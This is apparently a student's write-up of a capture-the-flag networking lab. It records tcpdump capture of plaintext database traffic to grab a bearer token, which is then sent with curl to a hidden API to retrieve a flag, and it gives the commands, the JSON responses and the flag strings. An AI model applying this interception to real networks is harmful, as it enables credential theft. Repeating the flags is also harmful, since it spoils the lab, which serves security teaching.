### My Findings
I intercepted the network using tcpdump and I was able to find the authentication token (which was the first flag that was found) in order to find the third flag. I was also able to see the specific sql queries being made to the database in plain text and I was able to see the resposnes to the queries. 

I documented the actual tcpdump inside the mitm/capture.pcap file and you are able to see all where I found the information.

In order to find the third flag, I used a custom HTTP header with curl which I knew was an option because it said within the original curl http request. So when I ran curl -H "Authorization: Bearer FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}" http://172.20.0.21:8888/flag I was able to find the flag: FLAG{p0rt_kn0ck1ng_4nd_h0n3yp0ts_s4v3_th3_d4y}



## Commands ran: 

sudo tcpdump -i br-83617199c7a3 -w capture.pcap 'port 3306'

curl http://172.20.21:8888
{"authentication":{"alternative":"?token=<token> query parameter","header":"Authorization: Bearer <token>","hint":"The token can be found by intercepting network traffic...","type":"Bearer token"},"endpoints":[{"description":"API information","method":"GET","path":"/"},{"description":"Health check","method":"GET","path":"/health"},{"description":"Get flag (requires authentication)","method":"GET","path":"/flag"},{"description":"Get secret data (requires authentication)","method":"GET","path":"/data"}],"message":"This is a hidden API service. Authentication required.","port":8888,"service":"Secret API Server","status":"running","version":"1.0"}

curl -H "Authorization: Bearer FLAG{n3tw0rk_tr4ff1c_1s_n0t_s3cur3}" http://172.20.0.21:8888/flag
{"flag":"FLAG{p0rt_kn0ck1ng_4nd_h0n3yp0ts_s4v3_th3_d4y}","message":"Congratulations! You successfully chained your exploits!","next_steps":["Now implement port knocking to protect the SSH service","Deploy a honeypot using the starter template"],"steps_completed":["1. Developed a port scanner","2. Discovered this hidden API service on port 8888","3. Performed MITM attack on database traffic","4. Extracted FLAG{1} (the API token) from network packets","5. Used FLAG{1} to authenticate to this API","6. Retrieved FLAG{3}"],"success":true}